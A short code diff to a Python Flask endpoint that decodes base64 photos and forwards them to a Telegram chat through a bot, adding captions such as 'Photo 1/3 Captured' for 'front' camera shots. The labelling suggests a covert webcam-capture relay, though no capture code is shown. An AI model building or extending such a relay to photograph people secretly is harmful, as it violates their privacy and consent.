@@ -51,10 +51,16 @@ def send_photo():
 
     chat_id = data.get("chat_id")
     photo = data.get("photo")
-    number = data.get("number", "")
+    number = data.get("number", "1")
 
     if not chat_id or not photo:
         return jsonify({"error": "missing"}), 400
+
+    # ✅ number extract (front-1 → 1)
+    try:
+        num = str(number).split("-")[-1]
+    except:
+        num = "1"
 
     header, imgstr = photo.split(",", 1)
     img_bytes = base64.b64decode(imgstr)
@@ -63,7 +69,7 @@ def send_photo():
         f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
         data={
             "chat_id": chat_id,
-            "caption": f"📸 {number}"
+            "caption": f"📸 Photo {num}/3 Captured\n\n⚡ Powered by @aditya_labs"
         },
         files={"photo": ("img.jpg", BytesIO(img_bytes))}
     )
